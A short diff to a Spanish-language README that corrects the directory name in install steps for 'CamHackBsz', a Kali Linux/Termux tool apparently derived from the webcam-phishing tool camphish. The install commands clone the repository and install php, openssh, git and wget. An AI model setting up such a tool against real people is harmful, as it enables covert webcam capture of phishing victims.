@@ -16,7 +16,7 @@
 # Instalación (Kali Linux/Termux):
 > git clon https://github.com/AvastrOficial/CamHackBsz
 <br></br>
-> cd camphish
+> cd CamHackBsz
 <br></br>
 > apt-get -y install php openssh git wget
 <br></br>
